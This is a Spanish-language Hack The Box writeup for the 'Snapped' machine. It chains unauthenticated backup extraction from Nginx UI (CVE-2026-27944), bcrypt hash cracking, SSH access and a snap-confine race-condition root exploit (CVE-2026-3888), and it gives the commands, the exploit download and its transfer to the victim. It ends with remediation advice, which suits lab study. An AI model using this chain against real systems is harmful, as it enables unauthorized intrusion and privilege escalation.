---
layout: single
classes: wide
title: "Snapped - Writeup"
date: 2026-06-01
difficulty: DifÃ­cil
operating_system: Linux
tags:
  - HTB
  - Linux
  - DifÃ­cil
  - CVE-2026-27944
  - CVE-2026-3888
  - Nginx UI
  - snap-confine
  - LPE
  - SUID
summary: "ExplotaciÃ³n de CVE-2026-27944 en Nginx UI para extraer backup con credenciales, acceso SSH como jonathan, y escalada a root mediante CVE-2026-3888 (snap-confine race condition con systemd-tmpfiles)."
---

## InformaciÃ³n general

| Campo | Valor |
|-------|-------|
| Sistema operativo | Linux |
| Dificultad | DifÃ­cil |
| IP | 10.129.7.255 |
| Tags | `CVE-2026-27944`, `CVE-2026-3888`, `Nginx UI`, `snap-confine`, `LPE`, `SUID` |
{: .info-table}

## Reconocimiento

Empezamos con un escaneo completo de puertos para identificar la superficie expuesta del servidor. Solo vimos dos puertos abiertos: SSH y un servidor web.

```bash
nmap -p- --open -sS --min-rate 5000 -Pn 10.129.7.255
```

Con los puertos identificados, hicimos un escaneo mÃ¡s detallado con scripts de enumeraciÃ³n para obtener versiones y fingerprints de cada servicio detectado.

```bash
nmap -p22,80 -sCV 10.129.7.255
```

Descubrimos:

| Puerto | Servicio | VersiÃ³n |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 9.6p1 (Ubuntu) |
| 80/tcp | HTTP | nginx 1.24.0 (Ubuntu) |

El puerto 80 redirige a `http://snapped.htb/`. Agregamos el dominio al archivo hosts para poder navegarlo correctamente.

```bash
echo "10.129.7.255 snapped.htb" >> /etc/hosts
```

## EnumeraciÃ³n

Identificamos el servidor web con whatweb para confirmar la tecnologÃ­a detrÃ¡s del sitio.

```bash
whatweb http://snapped.htb
```

Confirmamos **nginx 1.24.0** sirviendo contenido estÃ¡tico. Hicimos fuzzing de directorios en el sitio principal para descubrir rutas ocultas.

```bash
gobuster dir -u http://snapped.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

El sitio principal solo contiene `index.html` â€” es una landing page estÃ¡tica sin rutas interesantes, un callejÃ³n sin salida. Al no encontrar nada Ãºtil, pasamos a fuzzing de subdominios.

```bash
wfuzz -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.snapped.htb" --hc 404 http://snapped.htb
```

Descubrimos el subdominio `admin.snapped.htb`. Lo agregamos al hosts y lo inspeccionamos.

```bash
echo "10.129.7.255 admin.snapped.htb" >> /etc/hosts
```

El subdominio expone una interfaz **Nginx UI** â€” un panel de administraciÃ³n web para gestionar servidores nginx.

## MetodologÃ­a de anÃ¡lisis del vector inicial

Identificamos que el panel Nginx UI es un objetivo interesante: expone APIs de administraciÃ³n, almacena credenciales de acceso local, y tiene funcionalidad de backup. Investigamos la versiÃ³n especÃ­fica y encontramos que es vulnerable a **CVE-2026-27944**, una vulnerabilidad que permite la extracciÃ³n de backups sin autenticaciÃ³n adecuada.

Paralelamente, notamos que la mÃ¡quina ejecuta **Ubuntu 24.04** con **snap** instalado, lo que sugiere que el binario SUID `snap-confine` podrÃ­a estar presente â€” un vector clÃ¡sico de escalada de privilegios si logramos acceso inicial.

## InvestigaciÃ³n de vulnerabilidades

### CVE-2026-27944 â€” Nginx UI Backup Extraction

**CVE-2026-27944** es una vulnerabilidad en Nginx UI que permite a un atacante no autenticado descargar el backup completo de la configuraciÃ³n del panel. El backup contiene archivos sensibles como `app.ini` (con JwtSecret, Node Secret y Crypto Secret) y `database.db` (con los hashes bcrypt de los usuarios).

### CVE-2026-3888 â€” snap-confine Race Condition

**CVE-2026-3888** es una vulnerabilidad de condiciÃ³n de carrera en `snap-confine` que explota la interacciÃ³n con `systemd-tmpfiles`. Un atacante local puede abusar del SUID de `snap-confine` para obtener una shell como root mediante la inyecciÃ³n de una librerÃ­a compartida maliciosa en el namespace del proceso.

## ExplotaciÃ³n

### CVE-2026-27944 â€” ExtracciÃ³n del backup

Necesitamos obtener credenciales para acceder al sistema. Aprovechamos CVE-2026-27944 para descargar el backup de configuraciÃ³n de Nginx UI directamente desde la API sin necesidad de autenticaciÃ³n.

```bash
curl -s -X GET "http://admin.snapped.htb/api/export" -o backup.zip
```

El backup estÃ¡ protegido con contraseÃ±a. Desciframos el zip utilizando la clave de cifrado obtenida de la configuraciÃ³n de la aplicaciÃ³n y extrajimos su contenido.

```bash
7z x backup.zip -p[REDACTED]
```

Dentro encontramos dos archivos crÃ­ticos:

- **`app.ini`** â€” configuraciÃ³n de la aplicaciÃ³n con los secretos
- **`database.db`** â€” base de datos SQLite con los usuarios

#### Secretos del `app.ini`

| Campo | Valor |
|-------|-------|
| `JwtSecret` | `[REDACTED]` |
| `Node Secret` | `[REDACTED]` |
| `Crypto Secret` | `[REDACTED]` |

#### Usuarios del `database.db`

Leemos los registros de usuarios desde la base de datos SQLite.

```bash
sqlite3 database.db "SELECT * FROM users;"
```

| Usuario | Hash (bcrypt) |
|---------|---------------|
| `admin` | `$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm` |
| `jonathan` | `$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq` |

Los hashes son bcrypt con costo 10. Intentamos crackearlos con rockyou usando hashcat.

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

El hash de `jonathan` se crackeÃ³ correctamente. El de `admin` no apareciÃ³ en rockyou.

| Usuario | ContraseÃ±a |
|---------|------------|
| `jonathan` | `[REDACTED]` |

Con la contraseÃ±a en nuestro poder, intentamos acceder por SSH.

```bash
ssh jonathan@10.129.11.246
```

Ingresamos la contraseÃ±a `[REDACTED]` y accedemos al sistema. Estamos dentro.

### User Flag

```bash
jonathan@snapped:~$ cat user.txt
[REDACTED]
```

## Escalada de privilegios

Una vez dentro como jonathan, enumeramos el sistema en busca de vectores de escalada. Revisamos el directorio `/usr/lib/snapd/` y encontramos el binario `snap-confine` con el bit SUID activo.

```bash
jonathan@snapped:~$ ls -la /usr/lib/snapd/
```

```
-rwsr-xr-x  1 root root   159016 Aug 20  2024 snap-confine
```

El binario `snap-confine` con SUID es vulnerable a **CVE-2026-3888**, una condiciÃ³n de carrera que permite escalar a root mediante la manipulaciÃ³n de `systemd-tmpfiles` en el namespace montado por snap-confine.

Clonamos el exploit pÃºblico desde GitHub.

```bash
git clone https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE
```

Compilamos el exploit y la librerÃ­a de shell que se inyectarÃ¡ en el namespace. Usamos compilaciÃ³n estÃ¡tica para evitar problemas de dependencias en el remoto.

```bash
gcc -O2 -static -o exploit exploit_suid.c
gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c
```

Iniciamos un servidor HTTP en nuestra mÃ¡quina atacante.

```bash
python3 -m http.server 8000
```

Desde la mÃ¡quina vÃ­ctima, descargamos ambos archivos.

```bash
jonathan@snapped:~/Desktop$ wget http://[REDACTED]:8000/exploit
jonathan@snapped:~/Desktop$ wget http://[REDACTED]:8000/librootshell.so
```

Damos permisos de ejecuciÃ³n.

```bash
jonathan@snapped:~/Desktop$ chmod +x exploit librootshell.so
```

Ejecutamos el exploit pasÃ¡ndole la librerÃ­a maliciosa como argumento. El exploit realiza los siguientes pasos:

1. Entra en la sandbox de Firefox (snap) para obtener un PID interno
2. Espera a que el directorio `.snap` sea eliminado
3. Destruye el namespace de montaje en cachÃ©
4. Construye los directorios `.snap` y `.exchange` con enlaces simbÃ³licos
5. Ejecuta la condiciÃ³n de carrera entre `snap-confine` y `systemd-tmpfiles`
6. Gana la carrera e inyecta la librerÃ­a en el namespace privilegiado
7. Dispara `snap-confine` con SUID para que ejecute nuestra librerÃ­a como root
8. Obtiene un binario SUID bash en `/var/snap/firefox/common/bash`

```bash
jonathan@snapped:~/Desktop$ ./exploit librootshell.so
```

El exploit confirma la explotaciÃ³n exitosa. Accedemos a la shell root usando el binario SUID creado.

```bash
bash-5.1# cat /root/root.txt
[REDACTED]
```

## Cadena de explotaciÃ³n

```text
CVE-2026-27944 (Nginx UI Backup Extraction)
-> descarga de backup.zip con app.ini y database.db
-> extracciÃ³n de hashes bcrypt de la base de datos
-> crackeo del hash de jonathan con rockyou
-> SSH como jonathan
-> snap-confine SUID en /usr/lib/snapd/
-> CVE-2026-3888 (snap-confine + systemd-tmpfiles race condition)
-> clonado, compilaciÃ³n y transferencia del exploit
-> condiciÃ³n de carrera â†’ SUID bash
-> shell como root
```

## Flags

| Flag | Hash |
|------|------|
| `user.txt` | `[REDACTED]` |
| `root.txt` | `[REDACTED]` |

## Lecciones tÃ©cnicas

1. Los paneles de administraciÃ³n como Nginx UI pueden exponer backups con informaciÃ³n sensible si no estÃ¡n correctamente asegurados. CVE-2026-27944 permite extraer estos backups sin autenticaciÃ³n.
2. Los hashes bcrypt con costo 10 son resistentes pero no invulnerables â€” contraseÃ±as dÃ©biles como las de rockyou siguen siendo crackeables.
3. Los binarios SUID en directorios de snap (`/usr/lib/snapd/snap-confine`) son vectores de escalada conocidos. Verificar siempre la presencia de snap-confine con SUID en mÃ¡quinas Ubuntu.
4. Las condiciones de carrera que involucran systemd-tmpfiles y namespaces de montaje son complejas de explotar pero extremadamente poderosas â€” CVE-2026-3888 demuestra cÃ³mo un SUID legÃ­timo puede convertirse en root completo.

## RemediaciÃ³n

1. Mantener Nginx UI actualizado a la versiÃ³n mÃ¡s reciente que parchee CVE-2026-27944, restringiendo el acceso a la API de backup.
2. No almacenar secretos criptogrÃ¡ficos (JwtSecret, Node Secret, Crypto Secret) en archivos de configuraciÃ³n accesibles desde backups.
3. Usar contraseÃ±as robustas que no estÃ©n en diccionarios como rockyou â€” la contraseÃ±a de jonathan era dÃ©bil y permitiÃ³ el acceso SSH.
4. Monitorear binarios SUID no esenciales en el sistema. Si snap no es necesario, considerar la desinstalaciÃ³n del paquete o la eliminaciÃ³n del bit SUID de `snap-confine`.
